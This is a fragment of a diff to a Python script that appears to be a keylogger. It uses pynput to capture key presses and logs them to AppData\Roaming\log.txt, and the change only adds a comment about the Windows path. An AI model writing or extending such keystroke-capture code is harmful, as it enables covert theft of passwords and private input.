@@ -1,7 +1,7 @@
 from pynput import keyboard
 import os
 
-log_file = os.path.expanduser("~") + "\\AppData\\Roaming\\log.txt"
+log_file = os.path.expanduser("~") + "\\AppData\\Roaming\\log.txt"  #This path is only for windows . If you are in linux then edit the path
 
 def on_press(key):
     try:
